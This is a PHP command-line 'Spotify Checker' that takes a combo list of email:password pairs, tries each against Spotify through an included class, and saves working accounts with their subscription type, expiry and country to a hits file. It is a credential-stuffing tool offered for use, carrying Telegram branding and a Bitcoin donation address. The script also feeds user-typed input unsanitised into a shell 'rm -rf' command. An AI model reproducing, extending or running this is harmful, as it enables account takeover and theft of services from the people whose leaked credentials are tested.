
<?php
/*
* Created by @Voldemort1912
* Last Update: 28/03/2019
* Time: 1330
* Telegram @hewhomustnotbenamed
*/

// DO NOT MODIFY!! I WILL NOT BE RESPONSIBLE FOR ANY KIND OF MODIFICATIONS WHICH HINDER THE FUNCTIONABILITY OF THE PROGRAM!!!
$loc_ver = trim(file_get_contents('.version'));
//FIRST RUN (Install Dependencies)
if (is_file(".first")){
	$firstrun = trim(file_get_contents('.first'));
}else{
	$firstrun = true;
}
if ($firstrun == 'true'){
	echo "\033[01;32;1m[i] First Run Detected... Installing Dependencies.....";
	echo "\n[i] This Might Take a While! PLEASE DO NOT EXIT THE PROGRAM!...\n";
	sleep(1);
	echo "[#####";
	sleep(2);
	echo "##";
	sleep(1);
	echo "###";
		system('apt install curl python python2 figlet -y > /dev/null 2> /dev/null');
	for ($i=0; $i<15; $i++){
		echo "#"; 
		sleep(1);
	};
	echo "]";
	sleep(3);
	echo "\n[i] The Dependencies Have Been Installed Successfully!!";
	echo "\n[i] The Program has Been Installed Successfully!";
	echo "\n[i] Initiating Setup!!";
	sleep(3);
	
	echo "\n\033[51;33;1m[i] Show Only Hits ??  Type \033[01;32;1m'yes'\033[51;33;1m/\033[01;31m'no'\033[51;33;1m : \033[0m ";
	$conhan = fgets(fopen("php://stdin", "rb"));

	if (trim($conhan) == 'yes'){
		file_put_contents('.pref', '1');	//Hitsonly
	} else {
		file_put_contents('.pref', '0');	//all
	}
	
	echo "\n[i] Please Restart the Program to See the Changes";
	echo "\n[i] Press Enter to Exit...";
	fgetc(STDIN);
	file_put_contents('.first','false');
	exit;
	}


echo "\033[01;31m";
system("figlet -c 'Spotify Checker'");
echo"\033[0m";
sleep(2);
echo "\n\n
\033[01;31m[•]v".$loc_ver." Developed by \033[01;32;1m@hewhomustn0tbenamed\033[01;31m (Telegram).\n";
sleep(3);
echo "\033[01;31m[•]You're Responsible For your Actions. Use Wisely.\n";
sleep(1);
echo "[•]Join \033[01;32;1m@VoldemortCommunity (Telegram)\033[01;31m for More!.\n";
sleep(0.8);
echo "[•]Huge Thanks to @DrWean for His Outdated GitHub Repo.\n";
sleep(0.8);
echo "[•]Thank You to all the Testers!! and StackOverflow.\n\033[0m";
sleep(2);
include ('class.spotify.php');

	if(is_file('.pref')){
		$hitpref = trim(file_get_contents('.pref'));
	} else {
		$hitpref = '0';
	}
	

//Check Updates
$glo_ver = trim(file_get_contents('https://raw.githubusercontent.com/VoldemortCommunity/SpotifyChecker/master/.version'));
$loc_ver = trim(file_get_contents('.version'));
if($glo_ver > $loc_ver){
	echo "\033[01;32;1m[i] Update Available!!\n";
	$changes = file_get_contents("https://raw.githubusercontent.com/VoldemortCommunity/SpotifyChecker/master/.changelog");
	echo "[i] Changelog : \n".$changes;
	sleep(5);
	echo "\n\033[51;33;1m[i] Do you Want to Update to v".$glo_ver."?? Type \033[01;32;1m'yes'\033[51;33;1m to Continue :\033[0m ";
	$updatehandle = fopen("php://stdin", "rb");
	$ln = fgets($updatehandle);
	if (trim($ln) == 'yes'){
		echo "\033[05;32;1m[i] Updating Now...\n[i] Press Enter to Start...\033[0m";
		fgetc(STDIN);
		system('git reset --hard');
		system('git pull origin master');
		echo "\033[01;32;1m[i] Update Complete!! Please Restart to see Changes!!";
		echo "\n[i] Press Enter to Continue...";
		fgetc(STDIN);
		exit;
	}
} else {
	echo "[i] You're Already on the Latest Version!! Cheers!";
}

//Warning
echo "\n\033[51;33;1m[i]Are You Sure You Want To Do This?  Type \033[01;32;1m'yes'\033[51;33;1m to Continue :\033[0m ";
$warnhandle = fopen("php://stdin", "rb");
$ln = fgets($warnhandle);
if (trim($ln) !== 'yes'){
	echo "\033[05;31m[i]ABORT.\n[i]The Program will Now Exit!!\n[i]Press Enter to Continue...\033[0m";
	fgetc(STDIN);
	exit;
}

//Get ComboList
echo "\n\033[01;32;1m[i]Enter Combo List Name : \033[0m";
$combohandle = fopen("php://stdin", "r");
$inpnam = trim(fgets($combohandle));
if(strpos($inpnam, ".txt") == false){
	$inpnam .= ".txt";
}
if(!is_file($inpnam)){
	echo "\n\033[05;31m[i]ABORT.\n[i]The File ".$inpnam." does Not Exist!!\n[i]The Program will Now Exit!!\n[i]Press Enter to Continue...\033[0m";
	fgetc(STDIN);
	exit;
}
$lines = file(trim($inpnam));

/*//get ComboList Type
echo "\n \n\033[01;32;1m[i]Enter Combo List Type:\n \n[1] Email:Password\n \n[2] Username:Password\n \nResponse[1/2]:\033[0m ";
$comtype = fgets(fopen("php://stdin", "r"));
if (trim($comtype) == '2'){
	echo "\n\033[05;31m[i]ABORT.\n[i]This Feature Has Been Discontinued.\n[i]Contact \033[01;32;1m@hewhomustn0tbenamed\033[01;31m (Telegram) for Details.\n[i]The Program will Now Exit!!\n[i]Press Enter to Continue...\033[0m";
	fgetc(STDIN);
	exit;
}*/

//Saving Hits
echo "\n\033[51;33;1m[i] Enter File Name to Save Hits : \033[0m";
$handle3 = fopen("php://stdin", "rb");
$file = trim(fgets($handle3));
if(strpos($file, ".txt") == false){
	$file .= ".txt";
}
system('rm -rf '.$file);
file_put_contents($file, "[#] Spotify Checker v".$loc_ver."\n[#] Made by @hewhomustn0tbenamed (Telegram)\n[#] GitHub: https://github.com/VoldemortCommunity\n\n[#] Feeling Generous? Donate: 3QheChfSnPqBVBsnm1DFYg9xoHQmbnXP6d [BTC]\n\n\n");

$count = 0;
$combocount = 0;
//Starting
echo "Press Enter to Continue...";
fgetc(STDIN);
	
echo "\n\033[01;32;1m[i]Let's Begin...\n";
echo "\033[51;033;1m[i]Press Ctrl+C or Tap and Hold ~> More ~> Kill Process to Exit before The Execution Completes!\033[0m\n\n\n";

$spotify = new spotify();
foreach((array) $lines as $line) {
	$var = explode(':', $line);
	$usernn = trim($var[0]);
	$inppass = trim($var[1]);
	$res = $spotify->check($usernn, $inppass, 2);
	$dec = json_decode($res, true);
	if($dec["status"]==true){
		$count++;
		echo "\033[01;32;1m";
	} else {
		echo "\033[01;31m";
	}
	
	if ($dec['status'] == true){
		echo "[!] Email ID : " . $usernn . "\n"; 
		echo "[!] Password : " . $inppass . "\n";
		echo "[!] Subscription : " . $dec['subscription'] . "\n";
		echo "[!] Validity : " . $dec['expdate'] . "\n";
		echo "[!] Country : " . $dec['ip'] . "\n\n\n\033[0m";
		file_put_contents($file, "[!] Email ID : ".$usernn."\n[!] Password : ".$inppass."\n[!] Subscription : " . $dec['subscription'] . "\n[!] Validity : " . $dec['expdate'] . "\n[!] Country : " . $dec['ip'] . "\n[i] SpotifyChecker by @hewhomustn0tbenamed (Telegram)!!\n\n", FILE_APPEND);
	} else if($hitpref == '0'){
		echo "[!] Email ID : " . $usernn . "\n"; 
		echo "[!] Password : " . $inppass . "\n";
		echo "[!] Invalid Account! \n";
		echo "[!] " . $dec['error'] . "\n\n\n\033[0m";
	}
	$combocount++;
}

//End Program
echo "\n\n\n\033[01;32;1m[i] The Program has Executed Successfully!!\n[i] Combos Checked : ".$combocount."\n[i] Hits Found : ".$count."\n[i] Hits have been Saved to ".$file."\n[i] Spotify Checker by @hewhomustn0tbenamed!!\n\n      PEACE!!🖖\n ";
echo "\n\033[0m[i] Press Enter to Continue!! ";
fgetc(STDIN);
exit;
